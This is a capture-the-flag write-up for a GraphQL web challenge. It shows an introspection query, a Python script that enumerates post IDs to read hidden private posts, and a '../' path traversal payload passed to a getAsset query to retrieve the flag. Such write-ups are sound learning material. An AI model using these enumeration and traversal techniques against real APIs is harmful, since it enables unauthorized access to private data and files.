#### Challenge:

Now R-Boy can start his chase. He lands in 1230 BC during the reign of Ramses II. In the Valley of the Temples, Zer0 has plundered Nefertiti’s tomb to resell the precious treasures on the black market. By accident, the guards catch R-Boy near the tomb. To prove he’s not a thief, he has to show his devotion to the Pharaoh by finding a secret note.

http://gamebox1.reply.it/a37881ac48f4f21d0fb67607d6066ef7/

---

#### Solution:

We are provided with a static site with following comment:

```text
Our Time Travel forum is currently under construction. Please wait until we integrate our query and manipulation language for APIs. Please go to /graphql
```

Accessing [http://gamebox1.reply.it/a37881ac48f4f21d0fb67607d6066ef7/graphql](http://gamebox1.reply.it/a37881ac48f4f21d0fb67607d6066ef7/graphql) gives us `grapql console`. Inspired by [this writeup](https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/) we run following query and obtained its response:

Query:

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

Response:

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "fields": [
          {
            "name": "me",
            "description": null
          },
          {
            "name": "allUsers",
            "description": null
          },
          {
            "name": "user",
            "description": null
          },
          {
            "name": "post",
            "description": null
          },
          {
            "name": "allPublicPosts",
            "description": null
          },
          {
            "name": "getAsset",
            "description": null
          }
        ]
      }
    }
  }
}
```

The method `allPublicPosts` caught my attention, because where there are `"public"` posts there should be `"private"` ones too:

```graphql
{
  allPublicPosts {
    id
    #content
    title
    public
  }
}
```

```json
{
  "data": {
    "allPublicPosts": [
      {
        "id": "1",
        "title": "Unde vel qui molestiae est explicabo dolorum.",
        "public": true
      },
      {
        "id": "2",
        "title": "Voluptatem assumenda saepe debitis nostrum omnis.",
        "public": true
      },
      {
        "id": "3",
        "title": "Consequatur nobis architecto.",
        "public": true
      },
      {
        "id": "4",
        "title": "Vitae atque eius.",
        "public": true
      },
      {
        "id": "5",
        "title": "Doloremque quia ut.",
        "public": true
      },
      {
        "id": "7",
        "title": "Sunt earum blanditiis assumenda.",
        "public": true
      },
      {
        "id": "12",
        "title": "Facere ut id ea nostrum porro sunt sequi nihil sed.",
        "public": true
      },
      ...
      ...
      ...
      {
        "id": "248",
        "title": "Suscipit aliquam aut sunt et possimus magni.",
        "public": true
      },
      {
        "id": "250",
        "title": "Nihil ipsum iure eligendi itaque aut molestias voluptas.",
        "public": true
      },
      {
        "id": "251",
        "title": "Ut optio rerum eveniet a rerum.",
        "public": true
      }
```

The content of these posts were `Lorem ipsum` paragraphs so I intentionally omitted it, but from this output we can see that there are some `id`s missing in the sequence. Since there was not a method for listing private posts, but only a method `post(id)` for getting single post based on id, I whipped up following python snippet that bruteforces and lists `non-public` posts:

```python
#!/bin/python3

import requests

a = [1, 2, 3, 4, 5, 7, 12, 14, 15, 18, 24, 26, 27, 29, 31, 32, 34, 35, 36, 37, 38, 41, 42, 43, 44, 45, 47, 48, 49, 50, 54, 57, 58, 59, 62, 65, 66, 67, 68, 70, 71, 74, 76, 77, 79, 81, 84, 85, 86, 87, 88, 90, 95, 99, 106, 107, 108, 110, 111, 112, 113, 114, 115, 116, 117, 118, 125, 126, 127, 129, 132, 133, 135, 139, 140, 143, 149, 150, 151, 153, 154, 156, 157, 159, 160, 161, 162, 163, 169, 172, 173, 174, 175, 178, 181, 182, 186, 188, 189, 191, 192, 194, 198, 199, 201, 203, 207, 208, 209, 211, 212, 214, 221, 224, 225, 226, 227, 228, 230, 232, 234, 237, 238, 243, 245, 247, 248, 250, 251]

for x in range(260):
    if x not in a:
        URL = "http://gamebox1.reply.it/a37881ac48f4f21d0fb67607d6066ef7/graphql?query=%7B%0A%20%20post(id%3A%20"+str(x)+")%20%7B%0A%20%20%20%20id%0A%20%20%20%20title%0A%20%20%20%20content%0A%20%20%20%20author%20%7B%0A%20%20%20%20%20%20id%0A%20%20%20%20%7D%0A%20%20%7D%0A%7D"
        r = requests.get(url = URL)
        print(r.text)
```

This again returned lots of posts with `Lorem ipsum` paragraphs, but authors were so benevolent that they prefixed them with `uselesesstext`, so filtering that (and deleted posts) out we get:

```bash
python3 maze_graph.py | grep -v uselesesstext | grep -v null
```

```json
{"data":{"post":{"id":"40","title":"Personal notes","content":"Remember to delete the ../mysecretmemofile asset.","author":{"id":"1"}}}}
```

Running query to get the asset `../mysecretmemofile` reveals the flag:

```graphql
{
  getAsset(name: "../mysecretmemofile")
}
```

---

<details><summary>FLAG:</summary>

```
{FLG:st4rt0ffwith4b4ng!}
```

</details>
